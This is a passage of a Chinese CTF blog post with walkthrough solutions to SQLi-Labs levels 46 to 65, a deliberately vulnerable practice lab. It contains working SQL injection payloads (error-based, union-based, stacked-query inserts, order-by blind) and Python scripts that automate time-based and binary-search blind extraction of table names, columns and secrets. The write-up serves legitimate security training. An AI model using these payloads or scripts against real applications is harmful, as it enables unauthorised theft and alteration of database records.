<h4 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h4><p>order by注入，<code>?id=1 desc</code>和<code>?id=1 asc</code>返回的数据有区别说明可以进行注入。</p>
<ul>
<li>这一关会回显错误，因此可以采用报错注入。</li>
<li>除此之外，<code>rand(true)</code>和<code>rand(false)</code>返回的结果也不一样，可以利用这一点进行布尔盲注。</li>
<li>还有一种盲注的方法，即类似<code>?sort=id ^(select(select version()) regexp &#39;^5&#39;)</code>，原理就是就是在<code>regexp</code>正则匹配的时候，如果匹配到数据返回1(00000001)的时候，此时的1会和id中的数据的二进制进行异或，按照异或的结果进行升序排列，所以显示的排列会发生变化；反之当进行正则匹配的时候，未匹配到数据返回0(00000000)，此时数字和0异或的结果还是本身，所以显示的排列不会发生改变，所以可以布尔盲注，逐个猜解数据，当页面<strong>排序紊乱</strong>时则说明匹配正确，页面排序<strong>未发生紊乱</strong>时则说明匹配错误。</li>
<li>也可以通过类似<code>?sort=1 and (if((ascii(substr((select database() limit 0,1),1,1))=115),sleep(5),1))–+</code>进行时间盲注</li>
<li>导入导出文件into outfile参数也可以</li>
</ul>
<p>这里采用报错注入，payload：(报错字数有限，可修改limit的值逐条读出数据)<br><code>?sort=1 and extractvalue(1,concat(0x7e,( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1),0x7e))</code></p>
<br>

<h4 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h4><p>单引号闭合sort，其他的与上一关一样。</p>
<p>payload：<br><code>?sort=1&#39; and extractvalue(1,concat(0x7e,( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1),0x7e))--+</code><br><br></p>
<h4 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h4><p>这一关原理同less-46，但是不会回显报错信息，所以不能使用报错注入。</p>
<p>采用时间盲注，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># less-48</span></span><br><span class="line"><span class="comment"># auther：Lethe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://43.247.91.228:84/Less-48/&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">&#x27;QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="comment"># payload = f&quot;?sort=1 and if((substr(binary database(),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;),sleep(3),1)&quot;</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?sort=1 and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;),sleep(3),1)&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;?sort=1 and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;) ,<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),sleep(3),1)&quot;</span>       </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url+payload, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data += j</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<br>

<h4 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h4><p>同less-47单引号闭合，但是不能回显报错信息，所以还是采用时间盲注，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># less-49</span></span><br><span class="line"><span class="comment"># auther：Lethe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://43.247.91.228:84/Less-49/&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">&#x27;QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="comment"># payload = f&quot;?sort=1&#x27; and if((substr(binary database(),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;),sleep(3),1)--+&quot;</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?sort=1&#x27; and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;),sleep(3),1)--+&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;?sort=1&#x27; and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;) ,<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),sleep(3),1)--+&quot;</span>       </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url+payload, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data += j</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<br>

<h4 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h4><p>这一关是order by与堆叠注入结合，数字型，无闭合。</p>
<p>payload:<br><code>?sort=1;insert into users(id,username,password) values(&#39;20&#39;,&#39;lethe&#39;,&#39;lethe&#39;)--+</code></p>
<p>执行完上面payload后再<code>?sort=1</code>可以看到多出来一行数据<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/SQLi-Labs-solutions/20190726162456290.png" alt="在这里插入图片描述"><br><br></p>
<h4 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h4><p>与上一关的区别是这里用单引号进行了闭合。</p>
<p>payload：<br><code>?sort=1&#39;;insert into users(id,username,password) values(&#39;20&#39;,&#39;lethe&#39;,&#39;lethe&#39;)--+</code><br><br></p>
<h4 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h4><p>和less-50一样，只是不会回显错误，堆叠注入方式相同。</p>
<p>payload：<br><code>?sort=1;insert into users(id,username,password) values(&#39;20&#39;,&#39;lethe&#39;,&#39;lethe&#39;)--+</code><br><br></p>
<h4 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h4><p>和less-51一样，只是不会回显错误，堆叠注入方式相同。</p>
<p>payload：<br><code>?sort=1&#39;;insert into users(id,username,password) values(&#39;20&#39;,&#39;lethe&#39;,&#39;lethe&#39;)--+</code><br><br></p>
<h4 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h4><p>限制了只能在10次请求以内完成注入，且每次重置会生成随机的表名、列名和数据。</p>
<p>payload:<br><code>?id=1&#39;</code></p>
<p><code>?id=1&#39;--+</code></p>
<p><code>?id=1&#39; order by 3--+</code></p>
<p><code>?id=1&#39; order by 4--+</code></p>
<p><code>?id=-1&#39; union select 1,2,3--+</code></p>
<p><code>?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code><br>得到表名3UXZWY1KY9</p>
<p><code>?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;3UXZWY1KY9&#39;),3--+</code><br>得到四个列名id,sessid,secret_7RZ7,tryy</p>
<p><code>?id=-1&#39; union select 1,(select group_concat(secret_7RZ7) from 3UXZWY1KY9),3--+</code><br>得到数据VWKFpeoXofNsCqqxcfWGM9x7，并提交<br><br></p>
<h4 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h4><p>这里比上一关多给了四次机会，得先花不少次猜测闭合方式，按照前面提到的顺序，先猜单双引号和单独括号，然后在单双引号后逐个添加括号，一般最多两个括号，若有报错信息同时要关注报错的信息来进行判断。</p>
<p>本关闭合方式为：<code>($id)</code>知道了闭合方式后其他的和上一关就一样了。</p>
<p>payload:</p>
<p><strong>······</strong></p>
<p><code>?id=-1) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code><br>得到表名P6BV60ROT2</p>
<p><code>?id=-1) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;P6BV60ROT2&#39;),3--+</code><br>得到四个列名id,sessid,secret_EWSR,tryy</p>
<p><code>?id=-1) union select 1,(select group_concat(secret_EWSR) from P6BV60ROT2),3--+</code><br>得到数据Pwh5inh7TxaAV10IZRCc26MW<br><br></p>
<h4 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h4><p>闭合方式为：<code>(&#39;$id&#39;)</code>，其他的和上面一样。</p>
<p>payload:</p>
<p><strong>······</strong></p>
<p><code>?id=-1&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code><br>得到表名QS5C6XI6F0</p>
<p><code>?id=-1&#39;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;QS5C6XI6F0&#39;),3--+</code><br>得到四个列名id,sessid,secret_PYBQ,tryy</p>
<p><code>?id=-1&#39;) union select 1,(select group_concat(secret_PYBQ) from QS5C6XI6F0),3--+</code><br>得到数据bHnjS8Y6KtGQDTihKBCDG7sU<br><br></p>
<h4 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h4><p>闭合方式为：<code>&quot;$id&quot;</code>，其他的和上面一样。</p>
<p>payload:</p>
<p><strong>······</strong></p>
<p><code>?id=-1&quot; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code><br>得到表名9ODZ61QBP1</p>
<p><code>?id=-1&quot; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;9ODZ61QBP1&#39;),3--+</code><br>得到四个列名id,sessid,secret_Z0TV,tryy</p>
<p><code>?id=-1&quot; union select 1,(select group_concat(secret_Z0TV) from 9ODZ61QBP1 ),3--+</code><br>得到数据0MNZ3yAJ3N0XuSZIlYhrGbcj<br><br></p>
<h4 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h4><p>单引号闭合，但是只有五次机会。</p>
<p>但是尝试<code>?id=-1&#39; union select 1,2,3--+</code>时发现页面无法回显sql语句的结果，所以前面几关的方法不能用了，但是页面会回显错误信息，所以考虑报错注入。</p>
<p>payload:</p>
<p><code>?id=-1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+</code><br>得到表名AK0HRXW75I</p>
<p><code>?id=-1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;AK0HRXW75I&#39;),0x7e))--+</code><br>得到四个列名id,sessid,secret_RPHD,tryy</p>
<p><code>?id=-1&#39; and extractvalue(1,concat(0x7e,(select group_concat(secret_RPHD) from AK0HRXW75I),0x7e))--+</code><br>得到数据7wEINBWYdYvusRUrsV9bidFL</p>
<br>

<h4 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h4><p>这一关为数字型，未进行闭合，其他的与less-58相同。</p>
<p>payload:</p>
<p><code>?id=-1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+</code><br>得到表名NTGAY0ES0F</p>
<p><code>?id=-1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;NTGAY0ES0F&#39;),0x7e))--+</code><br>得到四个列名id,sessid,secret_9Y69,tryy</p>
<p><code>?id=-1 and extractvalue(1,concat(0x7e,(select group_concat(secret_9Y69) from NTGAY0ES0F),0x7e))--+</code><br>得到数据UpD0J8a6Q7RFjeMejjCujser</p>
<br>

<h4 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h4><p>经测试，闭合方式为：<code>(&quot;$id&quot;)</code>，其他与前两关相同。</p>
<p>payload:</p>
<p><code>?id=-1&quot;) and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+</code><br>得到表名HJ31CD4SZJ</p>
<p><code>?id=-1&quot;) and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;HJ31CD4SZJ&#39;),0x7e))--+</code><br>得到四个列名id,sessid,secret_L5OI,tryy</p>
<p><code>?id=-1&quot;) and extractvalue(1,concat(0x7e,(select group_concat(secret_L5OI) from HJ31CD4SZJ),0x7e))--+</code><br>得到数据RbCnjPhpQjy7psK1DXG1IL78</p>
<br>

<h4 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h4><p>经测试，闭合方式为：<code>((&#39;$id&#39;))</code>，其他与前两关相同。</p>
<p>payload:</p>
<p><code>?id=-1&#39;)) and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+</code><br>得到表名S0EAHB4X1I</p>
<p><code>?id=-1&#39;)) and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;S0EAHB4X1I&#39;),0x7e))--+</code><br>得到四个列名id,sessid,secret_5AJ4,tryy</p>
<p><code>?id=-1&#39;)) and extractvalue(1,concat(0x7e,(select group_concat(secret_5AJ4) from S0EAHB4X1I),0x7e))--+</code><br>得到数据5SIpSyz03MhX52krjGbqHot7</p>
<br>

<h4 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h4><p>经测试，闭合方式为：<code>(&#39;$id&#39;)</code>，这一关既不回显sql语句结果，也不回显错误信息，那就只能盲注了，要求是130次请求以内完成盲注。</p>
<p>下面关键就是如何减少请求的次数了…</p>
<p>那么首先，如果能知道跑出的数据，长度为多少肯定是最好的，就没必要进行多余的爆破了…</p>
<ul>
<li>前面几关可以发现随机的表名长度是固定的(长度为10)，这里也可以手工测试或写个脚本跑一下，这一阶段只是为了知道长度，之后可以进行重置。</li>
<li>在跑列名的时候，我们实际上只需要secret_XXXX这一列的列名，因此可以用<code>limit 2,1</code>之筛选出这个列名，甚至我们只需要跑出最后那随机的4位即可，前面的<code>secret_</code>是都一样的。</li>
<li>最后在注入出数据，发现数据也是固定的24位长度。</li>
</ul>
<p>除此之外，我前面的脚本都是采取顺序爆破的，这样更方便一点，但这里可以采用二分法来进行盲注，可以减少请求的次数。</p>
<p>脚本如下：</p>
<p>（1）表名：（已测试出表名长度为10）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://43.247.91.228:84/Less-62/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))  <span class="comment"># 大写字母和数字的ascii，len=36</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payloads = list(range(48,58))+list(range(65,91))+list(range(97,123))   # 大写字母、小写字母和数字的ascii，len=62</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>): </span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high =<span class="number">35</span></span><br><span class="line">    <span class="comment"># high = 61</span></span><br><span class="line">    <span class="keyword">while</span> high-low&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (high + low)//<span class="number">2</span></span><br><span class="line">        m = payloads[mid]</span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27;) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+&quot;</span> </span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Angelina&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>结果：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/SQLi-Labs-solutions/20190726212918224.png" alt="在这里插入图片描述"></p>
<p>（2）列名：（只爆破最后随机的4位）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://43.247.91.228:84/Less-62/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))  <span class="comment"># 大写字母和数字的ascii，len=36</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payloads = list(range(48,58))+list(range(65,91))+list(range(97,123))   # 大写字母、小写字母和数字的ascii，len=62</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">12</span>): </span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high =<span class="number">35</span></span><br><span class="line">    <span class="comment"># high = 61</span></span><br><span class="line">    <span class="keyword">while</span> high-low&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (high + low)//<span class="number">2</span></span><br><span class="line">        m = payloads[mid]</span><br><span class="line">        <span class="comment"># payload = f&quot;?id=1&#x27;) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;m&#125;--+&quot; </span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27;) and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;1X6T9FDAIW&#x27; limit 2,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+&quot;</span> </span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Angelina&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>结果：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/SQLi-Labs-solutions/2019072621292983.png" alt="在这里插入图片描述"><br>（3）最后的数据：（已知长度为24）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://43.247.91.228:84/Less-62/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payloads = list(range(48,58))+list(range(65,91))  # 大写字母和数字的ascii，len=36</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>))   <span class="comment"># 大写字母、小写字母和数字的ascii，len=62</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">25</span>): </span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    <span class="comment"># high =35</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high-low&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (high + low)//<span class="number">2</span></span><br><span class="line">        m = payloads[mid]</span><br><span class="line">        <span class="comment"># payload = f&quot;?id=1&#x27;) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;m&#125;--+&quot; </span></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=1&#x27;) and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;1X6T9FDAIW&#x27; limit 2,1),&#123;i&#125;,1))&gt;&#123;m&#125;--+&quot; </span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27;) and ascii(substr((select group_concat(secret_SQOB) from 1X6T9FDAIW),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+&quot;</span> </span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Angelina&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>结果：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/SQLi-Labs-solutions/20190726212950480.png" alt="在这里插入图片描述"><br><br></p>
<h4 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h4><p>闭合方式为：<code>&#39;$id&#39;</code>，其他的与less-62相同。</p>
<br>

<h4 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h4><p>闭合方式为：<code>(($id))</code>，其他的与less-62相同。</p>
<br>

<h4 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h4><p>闭合方式为：<code>(&quot;$id&quot;)</code>，其他的与less-62相同。</p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Lethe</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://lethe.site/blog/2019/0726/SQLi-Labs-solutions/">https://lethe.site/blog/2019/0726/SQLi-Labs-solutions/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span></span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/blog/tags/CTF/"># CTF</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/blog/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/blog/2019/0728/MVC-Simple-Message-Board/">MVC架构实现简易留言管理系统</a>
            
            
            <a class="next" rel="next" href="/blog/2019/0719/Python-multi-threaded-socket-simulation-multiplayer-chat-room/">Python多线程socket模拟C/S多人聊天室</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>Life is a struggle.</span>
        <!-- <span>© Lethe | 2019 - 2022</span> -->
    </div>
</footer>

    </div>
</body>

</html>